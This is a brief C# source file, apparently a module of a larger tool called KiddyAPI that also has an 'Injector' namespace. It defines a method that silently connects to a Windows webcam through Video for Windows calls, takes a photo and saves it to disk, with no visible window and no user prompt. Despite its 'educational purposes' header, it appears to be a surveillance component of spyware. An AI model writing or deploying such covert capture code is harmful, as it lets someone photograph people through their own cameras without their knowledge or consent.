/////////////////////////////////////////////////////////
//// Developer : Whiro
//// For for educational purposes
//////////////////////////////////////////////////////////
using System;
using System.Runtime.InteropServices;
using KiddyAPI.Injector;

namespace KiddyAPI.Info
{
    class WebCam
    {
        public static void GetPhoto(string path)
        {
            string dName = "".PadRight(100);
            string dVersion = "".PadLeft(100);
            IntPtr hwnd = NativeAPI.capCreateCaptureWindowA("VFW Capture", unchecked((int) 0x80000000) | 0x40000000, 0,
                0, 320, 240, 0, 0);
            NativeAPI.SendMessage(hwnd, 0x40a, 0, 0); //connect to Cam
            string savepath = path + DateTime.Now.ToString("yyyy.MM.dd HH.mm.ss") + ".jpg";
            IntPtr hBmp = Marshal.StringToHGlobalAnsi(savepath);
            NativeAPI.SendMessage(hwnd, 0x419, 0, hBmp.ToInt32()); //photo
            NativeAPI.SendMessage(hwnd, 0x40b, 0, 0); //disconnect
        }
    }
}
